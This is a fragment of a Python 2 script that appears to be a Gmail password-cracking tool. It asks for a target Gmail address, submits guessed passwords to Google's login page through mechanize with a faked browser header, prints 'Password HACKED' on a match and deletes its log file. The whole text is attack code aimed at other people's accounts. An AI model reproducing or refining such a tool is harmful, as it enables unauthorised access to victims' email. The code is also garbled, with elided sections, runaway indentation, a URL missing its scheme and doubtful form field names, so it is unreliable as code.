...
time.sleep(0.1)
user = raw_input('[✍️] Target Gmail Account >>> ')
time.sleep(0.1)
                                    ...
                                    browser = mechanize.Browser()
                                                browser.set_handle_robots(False)
                                                            browser.addheaders = [('User-agent', "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36")]
                                                                        gmail = browser.open('accounts.google.com')
                                                                                    dos = open('Google-Log.txt', 'w+')
                                                                                                browser.select_form(nr=0)
                                                                                                            browser.form['gmail'] = user
                                                                                                                        browser.form['pass'] = password
                                                                                                                                    browser.method = 'POST'
                                                                                                                                                browser.submit()
                                                                                                                                                            dos.write(browser.open('https://accounts.google.com').read())
                                                                                                                                                                        dos.seek(0)
                                                                                                                                                                                    text = dos.read().decode('UTF-8')
                                                                                                                                                                                                if text.find('home_icon', 0, len(text)) != -1:
                                                                                                                                                                                                                print '[+] Password HACKED 💯 '+password 
                                                                                                                                                                                                                                dos.close()
                                                                                                                                                                                                                                                os.system('rm Google-Log.txt || del Google-Log.txt')
                                                                                                                                                                                                                                                                exit()
                                                                                                                                                                                                                                                                            else:
                                                                                                                                                                                                                                                                                                                ...
                                                                                                                                                                                                                                                                                                                print '\n#############################################\n   Exiting..'
                                                                                                                                                                                                                                                                                                                            dos.close()
                                                                                                                                                                                                                                                                                                                                        os.system('rm Google-Log.txt || del Google-Log.txt')
                                                                                                                                                                                                                                                                                                                                                    exit()
time.sleep(0.1)
print 'Password is not Crack 😔 Please try again 😔.'
time.sleep(0.1)
dos.close()
os.system('rm Google-Log.txt || del Google-Log.txt')
exit()